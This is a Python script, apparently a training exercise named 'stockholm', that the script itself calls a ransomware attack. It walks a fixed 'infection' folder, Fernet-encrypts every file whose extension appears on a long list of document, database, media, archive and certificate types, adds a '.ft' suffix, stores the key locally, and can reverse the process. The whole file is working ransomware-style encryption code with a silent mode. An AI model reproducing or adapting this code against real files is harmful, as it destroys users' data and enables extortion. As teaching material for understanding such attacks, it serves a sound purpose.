import argparse
import os
from cryptography.fernet import Fernet


EXTS = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'
,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'
,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'
,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'
,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']


HOME = os.getenv("HOME")
PATH = HOME + "/stockholm/infection"
KEY_FILE = "encrypt.key"



def parse():
	parser = argparse.ArgumentParser(
		prog = "python3 stockholm.py",
		description = "The stockholm program does a ramsomware attack and it's capable of reverse it"
	)
	parser.add_argument("-v", "--version", action="store_true", help="Option -v, --version : Show the version of the program.", default = False)
	parser.add_argument("-r", "--reverse", help ="Option -r, --reverse : Reverse the infection, followed by the key entered as an argument.")
	parser.add_argument("-s", "--silent", action="store_true", help="Option -s, --silent : The program will not produce any output.", default=False)
	args = parser.parse_args()
	return args


def main(arg, fernet):
    for root, dirs, files in os.walk(PATH):
        for f in files:
            if not arg.reverse and f[f.rfind("."):] != ".ft" and f[f.rfind("."):] in EXTS:
                if not arg.silent:
                    print(root + "/" + f)
                ft_encrypt_decrypt(root + "/" + f, True, fernet)
                os.rename(root + "/" + f, root + "/" + f + ".ft")
            if arg.reverse and f[f.rfind("."):] == ".ft":
                if not arg.silent:
                    print(root + "/" + f)
                ft_encrypt_decrypt(root + "/" + f, False, fernet)
                os.rename(root + "/" + f, root + "/" + f[:f.rfind(".")])


def ft_encrypt_decrypt(file_path, encrypt, fernet):
    with open(file_path, "rb") as f:
        a_file = f.read()
    try:
        if encrypt:
            en_de = fernet.encrypt(a_file)
        else:
            en_de = fernet.decrypt(a_file)

    except:
        print("Something has fail.")
        return

    with open(file_path, "wb") as f:
        f.write(en_de)


if __name__ == "__main__":
    arg = parse()

    #Versión del programa.
    if arg.version:
        print("Version: Stockholm 1.0")

    #Comprobación de la carpeta infection.
    if not os.path.exists(PATH):
        if not arg.silent:
            print("Infection directory doesn't exist in " + HOME + "/stockholm/")

    # Crea la clave de encriptado si no existe
    if not os.path.exists(KEY_FILE) and not arg.reverse:
        key = Fernet.generate_key() # Generate new .key.
        with open(KEY_FILE, "wb") as f:
            f.write(key)

    #Lee y almacena la clave
    if not	arg.reverse:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
        fernet = Fernet(key)
    else:
        fernet = Fernet(arg.reverse)

    main(arg, fernet)